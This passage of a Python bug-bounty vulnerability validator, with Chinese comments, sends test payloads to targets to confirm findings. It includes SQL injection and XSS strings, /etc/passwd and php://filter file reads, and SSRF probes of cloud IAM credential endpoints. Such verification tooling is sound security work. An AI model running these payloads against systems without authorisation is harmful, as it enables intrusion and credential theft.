#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Validator — 确定性验证层 (XBOW-inspired deterministic verification).

集成所有散落验证工具为统一管线，20+ 漏洞类的确定性验证逻辑。
每个验证方法返回 Confirmed/Downgraded/Rejected + evidence。

设计目标:
  - 可独立运行: python validator.py --vuln sqli --url "http://x?q=1"
  - 可集成到飞轮: Validator().validate(technique, vuln_class, endpoint, payload)
  - 可接入 triage-validation: 作为 7-Question Gate 的 Q0 (自动预验证)
"""

from __future__ import annotations

# ⚠️ 类型注解快速看:
#   fn(x: str) -> bool          → "函数fn,参数x是文字,返回是或否"
#   list[str]                   → "字符串列表"
#   dict[str, int]              → "字典,键是文字,值是数字"
#   X | None                    → "可以是X,也可以是空"
#
# ⚠️ 中括号 [] 快速看:
#   d["key"] = "值"             → "在字典d里,key这一项写为'值'"
#   print(d["key"])             → "读出字典d里key这一项"
#   lst[0]                      → "列表lst里第1项"
#
#   看不懂括号里的 → 只看 # 中文注释 就行,括号是给Python看的

import json
import random
import re
import string
import time
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Literal, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qs

# ---------------------------------------------------------------------------
#  Typing
# ---------------------------------------------------------------------------

Verdict = Literal["confirmed", "downgraded", "rejected", "needs_human"]


class ValidationResult:
    """单一验证结果。"""

    def __init__(
        self,
        verdict: Verdict,
        confidence: float = 0.0,
        evidence: list[str] | None = None,
        method_used: str = "",
        raw_responses: list[Any] | None = None,
    ):
        self.verdict = verdict
        self.confidence = min(max(confidence, 0.0), 1.0)
        self.evidence = evidence or []
        self.method_used = method_used
        self.raw_responses = raw_responses or []
        self.ts = datetime.now().isoformat()

    def to_dict(self) -> dict:
        return {
            "verdict": self.verdict,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "method": self.method_used,
            "ts": self.ts,
        }

    def __repr__(self):
        return f"[{self.verdict.upper()}] ({self.confidence:.0%}) {self.method_used}"


# ---------------------------------------------------------------------------
#  OOB 检测 (HTTP + DNS)
# ---------------------------------------------------------------------------

try:
    from aimy.tools.oob_server import OOBServer, CallbackRecord
    _HAS_OOB = True
except ImportError:
    _HAS_OOB = False
    OOBServer = None  # type: ignore

# ── FP 降低配置 ─────────────────────────────────────────────────

# 各漏洞类置信度阈值（低于此值→needs_human 不自动报）
CONFIDENCE_THRESHOLDS: dict[str, float] = {
    "sqli":              0.85,  # SQLi 需高置信（基线+布尔/报错+二次确认）
    "xss":               0.90,  # XSS 需浏览器弹窗或dom执行确认
    "ssrf":              0.75,  # SSRF 有OOB回调即可
    "idor":              0.80,  # IDOR 需跨会话验证
    "cmdi":              0.90,  # CMDi 需OOB或时间基线+二次确认
    "ssti":              0.85,  # SSTI 需二次确认 {{7*6}}=42
    "lfi":               0.80,  # LFI 需确认文件内容特征
    "xxe":               0.80,  # XXE 需OOB
    "open_redirect":     0.60,  # open redirect 低危不卡
    "information_disclosure": 0.50,
}
# 登录页/认证墙特征（response body 片段）
AUTH_WALL_SIGNALS: list[str] = [
    "login", "sign in", "signin", "log in",
    "password", "username", "验证码", "登录", "登陆",
    "verifycode", "captcha", "verification code",
    "forgot", "reset password", "记住我",
    "welcome back", "member login",
]


def _detect_auth_wall(resp_text: str) -> float:
    """检测响应是否为登录页/认证墙。返回 0-1 的匹配分，>=0.5 判定为认证墙。"""
    if not resp_text:
        return 0.0
    low = resp_text.lower()
    hits = sum(1 for s in AUTH_WALL_SIGNALS if s in low)
    return min(1.0, hits / 5.0)  # 5个特征命中即判定为认证墙


def _build_baseline(
    url: str, param: str = "", method: str = "GET", body: dict | None = None
) -> tuple[int, str] | None:
    """建基线：发无害请求，返回 (响应大小, 响应摘要前100字)。"""
    clean_url = _build_url(url, param, "1" if param else "")
    resp = _http_get(clean_url)
    if resp:
        return (len(resp.text), resp.text[:100])
    return None


def _build_confirm_pair(
    url: str, param: str, true_p: str, false_p: str
) -> tuple[tuple[int, str] | None, tuple[int, str] | None]:
    """发 true/false 确认对，返回两个 (大小, 摘要) 或 None。"""
    r_t = _http_get(_build_url(url, param, true_p))
    r_f = _http_get(_build_url(url, param, false_p))
    t = (len(r_t.text), r_t.text[:100]) if r_t else None
    f = (len(r_f.text), r_f.text[:100]) if r_f else None
    return t, f


def _oob_check(cb_id: str, timeout: float = 8.0) -> list:
    """OOB callback 检测：等待并返回回调记录。"""
    if not _HAS_OOB:
        return []
    srv = OOBServer.get_instance()
    if not srv._running:
        srv.start()
    # 等待回调
    deadline = time.time() + timeout
    while time.time() < deadline:
        cbs = srv.pop_callbacks(cb_id)
        if cbs:
            return cbs
        time.sleep(0.5)
    return []


def _oob_register(cb_id: str) -> str:
    """注册 OOB callback ID，返回 callback URL。"""
    if not _HAS_OOB:
        return f"http://oob.local/cb/{cb_id}"
    srv = OOBServer.get_instance()
    return srv.register_callback_id(cb_id)


# ---------------------------------------------------------------------------
#  HTTP 辅助
# ---------------------------------------------------------------------------

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


def _build_url(base: str, param: str, value: str) -> str:
    """给 URL 的指定参数赋新值。"""
    parsed = urlparse(base)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_qs = urlencode(qs, doseq=True)
    from urllib.parse import ParseResult
    return ParseResult(
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_qs, parsed.fragment
    ).geturl()


import time

# 全局限速: 继承 bounty 场景的 ≤1 req/s
_LAST_VFY_REQ: float = 0.0
_VFY_RATE_LIMIT: float = 1.0


def _vfy_rate_limit():
    """Validator 级别速率限制。"""
    global _LAST_VFY_REQ
    elapsed = time.time() - _LAST_VFY_REQ
    if elapsed < _VFY_RATE_LIMIT:
        time.sleep(_VFY_RATE_LIMIT - elapsed)
    _LAST_VFY_REQ = time.time()


def _http_get(url: str, timeout: float = 10.0, **kwargs) -> Optional[requests.Response]:
    if not _HAS_REQUESTS:
        return None
    try:
        _vfy_rate_limit()
        return requests.get(url, timeout=timeout, allow_redirects=False,
                           headers={"User-Agent": "Mozilla/5.0 Validator"}, **kwargs)
    except Exception:
        return None


def _http_post(url: str, data: dict, timeout: float = 10.0, **kwargs) -> Optional[requests.Response]:
    if not _HAS_REQUESTS:
        return None
    try:
        _vfy_rate_limit()
        return requests.post(url, data=data, timeout=timeout, allow_redirects=False,
                            headers={"User-Agent": "Mozilla/5.0 Validator"}, **kwargs)
    except Exception:
        return None


# ---------------------------------------------------------------------------
#  Playwright 浏览器验证
# ---------------------------------------------------------------------------

_HAS_PLAYWRIGHT = False
try:
    from playwright.sync_api import sync_playwright
    _HAS_PLAYWRIGHT = True
except ImportError:
    pass


def _playwright_check(url: str, timeout: float = 10.0) -> dict:
    """Playwright 打开页面检测 alert() 弹窗。"""
    result = {"dialog_caught": False, "dialog_text": "", "error": ""}
    if not _HAS_PLAYWRIGHT:
        return result
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page(ignore_https_errors=True)
            dialog_data = [False, ""]

            def on_dialog(dlg):
                dialog_data[0] = True
                dialog_data[1] = dlg.message[:200]
                dlg.accept()

            page.on("dialog", on_dialog)
            page.goto(url, wait_until="domcontentloaded", timeout=int(timeout * 1000))
            time.sleep(0.5)
            browser.close()
            result["dialog_caught"] = dialog_data[0]
            result["dialog_text"] = dialog_data[1]
    except Exception as e:
        result["error"] = str(e)[:100]
    return result


# ---------------------------------------------------------------------------
#  主验证器
# ---------------------------------------------------------------------------


class Validator:
    """确定性验证引擎 — 20+ 漏洞类的独立验证方法。

    用法:
        v = Validator()
        result = v.validate(vuln_class="ssrf", url="http://x.com?url=http://target",
                           param="url", payload="http://169.254.169.254/")
        if result.verdict == "confirmed":
            print("Confirmed!")
    """

    # 每个漏洞类支持的验证方法
    METHODS: dict[str, list[str]] = {
        "ssrf":               ["oob_http", "oob_dns", "cloud_metadata", "internal_port"],
        "sqli":               ["time_based", "boolean_based", "error_based", "oob_dns"],
        "xss":                ["playwright", "http_reflection", "dom_alert"],
        "xxe":                ["oob_http", "file_read", "error_based"],
        "ssti":               ["math_test", "time_based", "oob_dns"],
        "cmdi":               ["time_based", "oob_dns", "oob_http"],
        "lfi":                ["file_read", "php_wrapper"],
        "idor":               ["idor_seq", "cross_session", "uuid_predictable"],
        "jwt":                ["alg_none", "key_confusion", "kid_path"],
        "graphql":            ["introspection", "batch_idor"],
        "cors":               ["origin_reflection", "credentialed_exfil"],
        "csrf":               ["token_missing", "same_site_bypass"],
        "race condition":     ["parallel_race", "toctou"],
        "race":               ["parallel_race", "toctou"],
        "smuggling":          ["cl_te", "te_cl"],
        "open redirect":      ["header_check", "redirect_follow"],
        "prototype pollution": ["merge_test", "key_injection"],
        "nosqli":             ["boolean_test", "time_test"],
        "rce":                ["oob_dns", "time_based", "http_callback"],
        "cache poisoning":    ["cache_key_test", "header_inject"],
        "business logic":     ["state_replay", "parallel_race"],
        "auth bypass":        ["token_reuse", "header_tamper"],
        "file upload":        ["extension_test", "content_test"],
        "subdomain takeover": ["dns_resolve", "http_status"],
        "waf bypass":         ["bypass_chain_test"],
        "crlf":               ["header_inject", "response_split"],
        "http smuggling":     ["cl_te", "te_cl"],
        "account takeover":   ["token_reuse", "email_verify"],
        "information disclosure": ["pattern_scan", "error_analysis"],
        "default_credentials": ["default_creds"],
        "clickjacking":       ["frame_test"],
        "exposure":           ["pattern_scan"],
    }

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self._log_buf: list[str] = []

    def log(self, msg: str):
        self._log_buf.append(msg)
        if self.verbose:
            print(f"  [Validator] {msg}")

    # ── 统一入口 ────────────────────────────────────────────────────

    def _prefilter_auth_wall(self, url: str) -> bool:
        """前置过滤：如果是认证墙登录页，跳过验证。"""
        resp = _http_get(url)
        if resp and _detect_auth_wall(resp.text) >= 0.5:
            self.log(f"Auth wall detected at {url}, skipping")
            return True
        return False

    def validate(
        self,
        vuln_class: str,
        url: str = "",
        param: str = "",
        payload: str = "",
        method: str = "GET",
        body: dict | None = None,
        headers: dict | None = None,
        second_url: str = "",
        session_a: dict | None = None,
        session_b: dict | None = None,
    ) -> ValidationResult:
        """统一验证入口。自动匹配验证方法。

        简化版: 传入 vuln_class + url/param/payload 即可。
        高级版: 传入 session_a/b 做跨会话验证 (IDOR/auth)。

        自动前置过滤:
          1. 认证墙检测 → 跳过
          2. 置信度阈值 → 低置信报 needs_human
        """
        vc = vuln_class.lower().strip()

        # 认证墙前置过滤
        if url and self._prefilter_auth_wall(url):
            return ValidationResult("rejected", 0.0,
                                    [f"Auth wall at {url}, skipped"],
                                    "prefilter_auth_wall")

        methods = self.METHODS.get(vc, [])

        if not methods:
            return ValidationResult("needs_human", 0.0,
                                    ["No automated validator for this class"],
                                    "none")

        # 置信度阈值：低于阈值的不自动确认
        threshold = CONFIDENCE_THRESHOLDS.get(vc, 0.5)

        # 按优先级尝试，一过就返回
        for m in methods:
            fn_name = f"_verify_{m}"
            fn = getattr(self, fn_name, None)
            if fn is None:
                continue

            self.log(f"Trying {m} for {vc}...")
            try:
                result = fn(
                    url=url, param=param, payload=payload,
                    method=method, body=body, headers=headers,
                    second_url=second_url,
                    session_a=session_a, session_b=session_b,
                )
            except Exception as e:
                self.log(f"  {m} error: {e}")
                continue

            if result.verdict == "confirmed":
                result.method_used = m
                return result
            if result.verdict == "downgraded":
                result.method_used = m
                return result
            # rejected → 继续试下一种方法

        return ValidationResult("rejected", 0.0,
                                ["All validation methods failed"],
                                ",".join(methods[:3]))

    # ── OOB 检测 ────────────────────────────────────────────────────

    def _verify_oob_http(self, **kw) -> ValidationResult:
        """OOB HTTP callback 检测。"""
        cb_id = f"vfy_{random.randint(10000, 99999)}"
        cb_url = _oob_register(cb_id)
        payload = kw.get("payload", "").replace("OOB_URL", cb_url)
        url = kw.get("url", "")
        param = kw.get("param", "")

        if url and param:
            _http_get(_build_url(url, param, payload))
        elif url and not param:
            _http_get(url.replace("OOB_URL", cb_url))

        cbs = _oob_check(cb_id, timeout=8.0)
        if cbs:
            return ValidationResult("confirmed", 0.95,
                                    [f"OOB HTTP callback received from {c.client}" for c in cbs])
        return ValidationResult("rejected", 0.1, ["No OOB HTTP callback"], "oob_http")

    def _verify_oob_dns(self, **kw) -> ValidationResult:
        """OOB DNS callback 检测。"""
        cb_id = f"dns_{random.randint(10000, 99999)}"
        cb_url = _oob_register(cb_id)
        domain = cb_url.split("/")[-1]
        # 构造 DNS OOB payload: `nslookup {domain}`
        payload = kw.get("payload", "").replace("OOB_DOMAIN", domain)
        url = kw.get("url", "")
        param = kw.get("param", "")

        if url and param:
            _http_get(_build_url(url, param, payload))
        elif url:
            _http_get(url.replace("OOB_DOMAIN", domain))

        cbs = _oob_check(cb_id, timeout=10.0)
        if cbs:
            return ValidationResult("confirmed", 0.95,
                                    [f"OOB DNS callback from {c.client}" for c in cbs])
        return ValidationResult("rejected", 0.1, ["No OOB DNS callback"], "oob_dns")

    def _verify_http_callback(self, **kw) -> ValidationResult:
        """HTTP OOB 回调 (别名)。"""
        return self._verify_oob_http(**kw)

    def _verify_cloud_metadata(self, **kw) -> ValidationResult:
        """SSRF: 云元数据端点验证。"""
        url = kw.get("url", "")
        param = kw.get("param", "")
        endpoints = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
        ]
        for ep in endpoints:
            full_url = _build_url(url, param, ep) if param else url.replace("URL", ep)
            resp = _http_get(full_url)
            if resp and resp.status_code == 200 and resp.text.strip():
                markers = ["ami-id", "instance-id", "security-credentials",
                          "project/", "computeMetadata"]
                if any(m in resp.text[:500] for m in markers):
                    return ValidationResult("confirmed", 0.95,
                                            [f"Cloud metadata accessible via {ep}: {resp.text[:200]}"])

        return ValidationResult("rejected", 0.1, ["No cloud metadata access"], "cloud_metadata")

    def _verify_internal_port(self, **kw) -> ValidationResult:
        """SSRF: 内网端口扫描验证。"""
        url = kw.get("url", "")
        param = kw.get("param", "")

        # 试几个通用内网地址
        targets = ["http://127.0.0.1:80/", "http://127.0.0.1:8080/",
                   "http://localhost:22/", "http://0.0.0.0:6379/"]
        for t in targets:
            full_url = _build_url(url, param, t) if param else url.replace("INTRNL", t)
            resp = _http_get(full_url)
            if resp and resp.status_code < 500 and resp.status_code != 0:
                return ValidationResult("confirmed", 0.85,
                                        [f"Internal port accessible: {t} (HTTP {resp.status_code})"])

        return ValidationResult("rejected", 0.1, ["No internal port access"], "internal_port")

    # ── SQLi ────────────────────────────────────────────────────────

    def _verify_time_based(self, **kw) -> ValidationResult:
        """时间盲注验证。3次取平均基线。"""
        url = kw.get("url", "")
        param = kw.get("param", "")

        # 基线（3次取平均，消除网络抖动）
        baseline_times = []
        for _ in range(3):
            t0 = time.time()
            _http_get(_build_url(url, param, "1"))
            baseline_times.append(time.time() - t0)
        baseline_t = sum(baseline_times) / len(baseline_times)

        # 测试: SQLi sleep(5) vs normal
        sleep_payloads = [
            "1' OR SLEEP(5)-- -", "1' WAITFOR DELAY '0:0:5'--",
            "1' AND 1=SLEEP(5)--", "1);SELECT SLEEP(5)--",
            "1'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        ]
        for p in sleep_payloads:
            start = time.time()
            _http_get(_build_url(url, param, p))
            elapsed = time.time() - start
            if elapsed >= max(4.0, baseline_t + 3.0):
                return ValidationResult("confirmed", 0.9,
                                        [f"Time delay: {elapsed:.1f}s vs baseline {baseline_t:.1f}s via {p[:30]}"])
        return ValidationResult("rejected", 0.1, ["No time-based SQLi detected"], "time_based")

    def _verify_boolean_based(self, **kw) -> ValidationResult:
        """布尔盲注验证。3请求确认链: 基线→true→false→比对。

        只有在 true≠false 且 两者之一≈基线 时才确认。
        如果所有响应都≈登录页大小，判定为认证墙跳过。
        """
        url = kw.get("url", "")
        param = kw.get("param", "")

        # 建基线（无害请求）
        baseline = _build_baseline(url, param)
        if baseline is None:
            return ValidationResult("rejected", 0.0, ["Cannot reach target"], "boolean_based")
        base_size, _ = baseline

        # 检测是否全返回登录页
        auth_score = _detect_auth_wall(_http_get(_build_url(url, param, "1")).text if _http_get(_build_url(url, param, "1")) else "")
        if auth_score >= 0.5:
            return ValidationResult("rejected", 0.0, [f"Auth wall (score={auth_score:.1f})"], "boolean_based")

        pairs = [
            ("1' AND 1=1-- -", "1' AND 1=2-- -"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("' OR '1'='1", "' OR '1'='2"),
        ]
        for true_p, false_p in pairs:
            pair = _build_confirm_pair(url, param, true_p, false_p)
            if pair is None or pair[0] is None or pair[1] is None:
                continue
            (t_size, t_text), (f_size, f_text) = pair[0], pair[1]

            # 确认链：true≠false 且 其一≈基线
            diff = abs(t_size - f_size)
            t_vs_base = abs(t_size - base_size)
            f_vs_base = abs(f_size - base_size)
            min_diff = min(t_vs_base, f_vs_base)

            if diff > 20 and min_diff < 100:
                return ValidationResult("confirmed", 0.85,
                                        [f"Boolean diff: true={t_size}b false={f_size}b "
                                         f"baseline={base_size}b diff={diff}b"])
            # 如果 true/false 都离基线很远，可能是认证墙或动态页面
            if diff > 20 and t_vs_base > 200 and f_vs_base > 200:
                self.log(f"Suspicious: t/f both far from baseline ({t_vs_base}/{f_vs_base})")
                continue

        return ValidationResult("rejected", 0.1, ["No boolean-based SQLi"], "boolean_based")

    def _verify_error_based(self, **kw) -> ValidationResult:
        """报错注入验证。"""
        url = kw.get("url", "")
        param = kw.get("param", "")

        error_payloads = [
            "1' AND extractvalue(1, CONCAT(0x7e, (SELECT @@version)))--",
            "1' AND 1=CONVERT(int, @@version)--",
            "1' AND 1=CAST((SELECT @@version) AS int)--",
        ]
        error_signals = ["sql", "syntax error", "mysql_fetch", "ora-",
                        "unclosed", "quotation mark", "odbc", "microsoft ole db"]
        for p in error_payloads:
            resp = _http_get(_build_url(url, param, p))
            if resp and any(s in resp.text[:1000].lower() for s in error_signals):
                return ValidationResult("confirmed", 0.8,
                                        [f"SQL error in response via {p[:30]}"])
        return ValidationResult("rejected", 0.05, ["No error-based SQLi"], "error_based")

    # ── XSS ────────────────────────────────────────────────────────

    def _verify_playwright(self, **kw) -> ValidationResult:
        """Playwright 浏览器弹窗检测。"""
        url = kw.get("url", "")
        param = kw.get("param", "")
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
        ]
        for p in payloads:
            full_url = _build_url(url, param, p)
            pw = _playwright_check(full_url)
            if pw["dialog_caught"]:
                return ValidationResult("confirmed", 0.95,
                                        [f"Playwright alert({pw['dialog_text']}) via {p[:20]}"])
        return ValidationResult("rejected", 0.1, ["No XSS via Playwright"], "playwright")

    def _verify_http_reflection(self, **kw) -> ValidationResult:
        """反射 XSS: payload 是否原样返回。"""
        url = kw.get("url", "")
        param = kw.get("param", "")

        payload = f"VFY_{random.randint(10000, 99999)}_<b>xss"
        resp = _http_get(_build_url(url, param, payload))
        if resp and payload in resp.text:
            # 检查是否被编码
            escaped_payload = payload.replace("<", "&lt;")
            if escaped_payload not in resp.text or payload in resp.text:
                return ValidationResult("confirmed", 0.75,
                                        [f"Payload reflected unescaped in response"])
        return ValidationResult("rejected", 0.1, ["XSS payload not reflected"], "http_reflection")

    def _verify_dom_alert(self, **kw) -> ValidationResult:
        """DOM XSS: 通过 Playwright 检测。"""
        return self._verify_playwright(**kw)

    # ── XXE ─────────────────────────────────────────────────────────

    def _verify_file_read(self, **kw) -> ValidationResult:
        """文件读取验证 (LFI/XXE)。"""
        url = kw.get("url", "")
        param = kw.get("param", "")
        payloads_file = {
            "file:///etc/passwd": ["root:", "/bin/bash"],
            "/etc/passwd": ["root:", "daemon:"],
            "../../../../etc/passwd": ["root:", "nobody:"],
            "php://filter/convert.base64-encode/resource=index.php": ["PD9waHA", "PD9waHA="],
        }

        for payload, markers in payloads_file.items():
            if kw.get("payload"):
                payload = kw["payload"]
            full_url = _build_url(url, param, payload) if param else url.replace("FILE", payload)
            resp = _http_get(full_url)
            if resp and any(m in resp.text[:1000] for m in markers):
                return ValidationResult("confirmed", 0.9,
                                        [f"File read confirmed via {payload[:40]}: {resp.text[:150]}"])
            if kw.get("payload"):
                break  # 如果是自定义 payload，试一次就停

        return ValidationResult("rejected", 0.1, ["No file read confirmed"], "file_read")

    def _verify_php_wrapper(self, **kw) -> ValidationResult:
        """PHP wrapper LFI 验证。"""
        return self._verify_file_read(**kw)

    # ── SSTI ───────────────────────────────────────────────────────

    def _verify_math_test(self, **kw) -> ValidationResult:
        """SSTI: 数学表达式测试。含二次确认链。"""
        url = kw.get("url", "")
        param = kw.get("param", "")

        # 主测试 + 二次确认
        confirm_pairs = [
            ("{{7*7}}", "49", "{{7*6}}", "42"),
            ("${7*7}", "49", "${7*6}", "42"),
            ("#{7*7}", "49", "#{7*6}", "42"),
        ]
        for p1, e1, p2, e2 in confirm_pairs:
            full_url1 = _build_url(url, param, p1)
            resp1 = _http_get(full_url1)
            if not resp1 or e1 not in resp1.text:
                continue

            # 二次确认：用不同表达式验证
            full_url2 = _build_url(url, param, p2)
            resp2 = _http_get(full_url2)
            if resp2 and e2 in resp2.text:
                return ValidationResult("confirmed", 0.90,
                                        [f"SSTI confirmed: {p1}→{e1} and {p2}→{e2}"])

            # 单次命中但二次未确认 → 降级
            return ValidationResult("downgraded", 0.40,
                                    [f"SSTI suspected but unconfirmed: {p1}→{e1} but {p2}≠{e2}"],
                                    "math_test")

        return ValidationResult("rejected", 0.1, ["No SSTI math evaluation"], "math_test")

    # ── IDOR ────────────────────────────────────────────────────────

    def _verify_idor_seq(self, **kw) -> ValidationResult:
        """IDOR 单 session 验证: 相邻 ID 对比。"""
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "idor_seq")

        import re
        ids = re.findall(r'/(\d+)/', url) + re.findall(r'[?&](\d+)', url) + re.findall(r'/(\d+)$', url)
        if not ids:
            return ValidationResult("needs_human", 0.0, ["No numeric ID found"], "idor_seq")

        base_id = int(ids[-1])
        try:
            resp_base = _http_get(url)
            if not resp_base:
                return ValidationResult("rejected", 0.1, ["No baseline"], "idor_seq")
            base_text = resp_base.text
            base_len = len(base_text)

            for offset in [-1, +1, -2, +2, -10, +10]:
                test_id = base_id + offset
                test_url = url.replace(str(base_id), str(test_id))
                resp = _http_get(test_url)
                if resp and resp.status_code in (200, 302):
                    diff = abs(len(resp.text) - base_len)
                    if diff > 50 and resp.text != base_text:
                        return ValidationResult("confirmed", 0.75, [
                            f"IDOR seq: {base_id}->{test_id}, diff={diff}b"
                        ])
                    if resp.text != base_text:
                        return ValidationResult("confirmed", 0.65, [
                            f"IDOR seq: {base_id}->{test_id}, different content"
                        ])
        except Exception:
            pass
        return ValidationResult("rejected", 0.2, ["No IDOR via seq"], "idor_seq")

    def _verify_cross_session(self, **kw) -> ValidationResult:
        """IDOR: 跨会话验证。"""
        url = kw.get("url", "")
        session_a = kw.get("session_a")
        session_b = kw.get("session_b")

        if not session_a or not session_b:
            return ValidationResult("needs_human", 0.0,
                                    ["Need two sessions for IDOR validation"],
                                    "cross_session")

        try:
            headers_a = {"Cookie": session_a.get("cookie", ""),
                        "Authorization": session_a.get("auth", "")}
            headers_b = {"Cookie": session_b.get("cookie", ""),
                        "Authorization": session_b.get("auth", "")}

            r_a = requests.get(url, headers=headers_a, timeout=10)
            r_b = requests.get(url, headers=headers_b, timeout=10)

            if r_a.status_code == 200 and r_b.status_code == 200:
                if r_a.text != r_b.text:
                    return ValidationResult("confirmed", 0.85,
                                            [f"Cross-session IDOR: different data returned for same URL"])
        except Exception:
            pass
        return ValidationResult("rejected", 0.1, ["No cross-session IDOR"], "cross_session")

    def _verify_uuid_predictable(self, **kw) -> ValidationResult:
        """UUID 可预测性验证。"""
        return ValidationResult("needs_human", 0.3,
                                ["UUID predictability requires manual analysis"],
                                "uuid_predictable")

    # ── JWT ─────────────────────────────────────────────────────────

    def _verify_alg_none(self, **kw) -> ValidationResult:
        """JWT: alg=none 绕过。"""
        import base64
        payload = kw.get("payload", "")
        # 如果payload是JWT token
        if payload and payload.count(".") == 2:
            parts = payload.split(".")
            try:
                header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                if header.get("alg", "").lower() == "none":
                    return ValidationResult("confirmed", 0.9,
                                            ["JWT alg=none attack confirmed"])
            except Exception:
                pass
        return ValidationResult("rejected", 0.05, ["No JWT alg=none"], "alg_none")

    def _verify_key_confusion(self, **kw) -> ValidationResult:
        """JWT: RS256→HS256 密钥混淆。"""
        return ValidationResult("needs_human", 0.2,
                                ["JWT key confusion requires public key"],
                                "key_confusion")

    def _verify_kid_path(self, **kw) -> ValidationResult:
        """JWT: kid 路径遍历。"""
        return ValidationResult("needs_human", 0.3,
                                ["JWT kid traversal requires manual check"],
                                "kid_path")

    # ── GraphQL ─────────────────────────────────────────────────────

    def _verify_introspection(self, **kw) -> ValidationResult:
        """GraphQL 内省查询验证。"""
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "introspection")

        q = '{"query":"{__schema{types{name,fields{name}}}"}'
        resp = _http_post(url, json.dumps({"query": "{__schema{types{name}}}"}),
                          headers={"Content-Type": "application/json"})
        if resp and resp.status_code == 200 and "__schema" in resp.text:
            return ValidationResult("confirmed", 0.85,
                                    ["GraphQL introspection enabled"])
        return ValidationResult("rejected", 0.1, ["No introspection"], "introspection")

    def _verify_batch_idor(self, **kw) -> ValidationResult:
        """GraphQL: 批量查询 IDOR。"""
        return ValidationResult("needs_human", 0.2,
                                ["GraphQL batch IDOR requires session context"],
                                "batch_idor")

    # ── CORS ────────────────────────────────────────────────────────

    def _verify_origin_reflection(self, **kw) -> ValidationResult:
        """CORS: Origin 反射检测。"""
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "origin_reflection")

        evil_origin = "https://evil-validator.example.com"
        resp = _http_get(url, headers={"Origin": evil_origin})
        if resp:
            aao = resp.headers.get("Access-Control-Allow-Origin", "")
            aac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if aao == evil_origin or aao == "*":
                ev = []
                if aao == evil_origin:
                    ev.append(f"Origin reflected: {aao}")
                if aao == "*":
                    ev.append("Wildcard CORS")
                if aac == "true":
                    ev.append("Credentials allowed")
                return ValidationResult("confirmed", 0.85, ev)
        return ValidationResult("rejected", 0.1, ["No CORS misconfig"], "origin_reflection")

    def _verify_credentialed_exfil(self, **kw) -> ValidationResult:
        """CORS: 带凭证请求检测。"""
        return self._verify_origin_reflection(**kw)

    # ── Open Redirect ───────────────────────────────────────────────

    def _verify_header_check(self, **kw) -> ValidationResult:
        """Open Redirect: Location header 检测。"""
        url = kw.get("url", "")
        param = kw.get("param", "")
        evil_url = "https://evil-validator.example.com/"

        payload = kw.get("payload", evil_url)
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "header_check")

        full_url = _build_url(url, param, payload) if param else url.replace("URL", payload)
        resp = _http_get(full_url)
        if resp:
            location = resp.headers.get("Location", "")
            if location and ("evil-validator" in location or location.startswith("//")):
                return ValidationResult("confirmed", 0.85,
                                        [f"Open redirect to: {location}"])
        return ValidationResult("rejected", 0.1, ["No open redirect"], "header_check")

    def _verify_redirect_follow(self, **kw) -> ValidationResult:
        """Open Redirect: 跟随检测。"""
        return self._verify_header_check(**kw)

    # ── Race Condition ──────────────────────────────────────────────

    def _verify_parallel_race(self, **kw) -> ValidationResult:
        """竞态条件: 并行请求验证。"""
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "parallel_race")

        import threading
        responses = []
        lock = threading.Lock()

        def req():
            resp = _http_get(url)
            if resp:
                with lock:
                    responses.append(resp.status_code)

        threads = [threading.Thread(target=req) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=2)

        if len(responses) > 0:
            # 检测是否有多余的200（比如优惠券被多次使用）
            return ValidationResult("needs_human", 0.4,
                                    [f"Race test: {len(responses)} responses, statuses={set(responses)}"],
                                    "parallel_race")
        return ValidationResult("rejected", 0.1, ["No race condition detected"], "parallel_race")

    def _verify_toctou(self, **kw) -> ValidationResult:
        """TOCTOU 验证。"""
        return self._verify_parallel_race(**kw)

    # ── CSRF ────────────────────────────────────────────────────────

    def _verify_token_missing(self, **kw) -> ValidationResult:
        """CSRF: token 缺失检测。"""
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "token_missing")

        resp = _http_get(url)
        if resp:
            text_lower = resp.text.lower()
            has_csrf_token = any(m in text_lower for m in
                                ["csrf", "_token", "authenticity_token", "__requestverificationtoken"])
            has_same_site = any(m in resp.headers.get("Set-Cookie", "").lower()
                               for m in ["samesite=strict", "samesite=lax"])
            if not has_csrf_token and not has_same_site:
                return ValidationResult("confirmed", 0.6,
                                        ["No CSRF token or SameSite cookie found"])
            elif not has_csrf_token:
                return ValidationResult("downgraded", 0.3,
                                        ["No CSRF token but SameSite cookie present"])
        return ValidationResult("rejected", 0.1, ["CSRF protection likely present"], "token_missing")

    def _verify_same_site_bypass(self, **kw) -> ValidationResult:
        """SameSite bypass 检测。"""
        return ValidationResult("needs_human", 0.2,
                                ["SameSite bypass needs manual verification"],
                                "same_site_bypass")

    # ── 其他 ────────────────────────────────────────────────────────

    def _verify_bypass_chain_test(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.2,
                                ["WAF bypass chain needs manual testing"],
                                "bypass_chain_test")

    def _verify_dns_resolve(self, **kw) -> ValidationResult:
        """子域名接管: DNS 解析验证。"""
        import socket
